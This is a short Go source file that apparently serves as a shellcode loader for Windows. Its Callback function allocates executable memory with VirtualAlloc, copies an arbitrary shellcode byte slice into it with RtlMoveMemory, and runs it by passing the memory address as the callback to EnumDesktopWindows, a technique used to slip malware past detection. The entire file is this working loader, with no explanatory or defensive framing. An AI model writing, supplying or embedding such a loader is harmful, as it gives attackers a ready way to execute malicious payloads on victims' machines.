package TT

import (
	"syscall"
	"unsafe"
)

var (
	timer int
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32           = syscall.MustLoadDLL("kernel32.dll")
	ntdll              = syscall.MustLoadDLL("ntdll.dll")
	User32             = syscall.MustLoadDLL("User32.dll")
	VirtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
	GetCurrentThreadId = kernel32.MustFindProc("GetCurrentThreadId")
	EnumDesktopWindows = User32.MustFindProc("EnumDesktopWindows")
	GetThreadDesktop   = User32.MustFindProc("GetThreadDesktop")
	RtlMoveMemory      = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	Thr, _, _ := GetCurrentThreadId.Call()
	ThrD, _, _ := GetThreadDesktop.Call(Thr)

	EnumDesktopWindows.Call(ThrD, addr, 0)
}
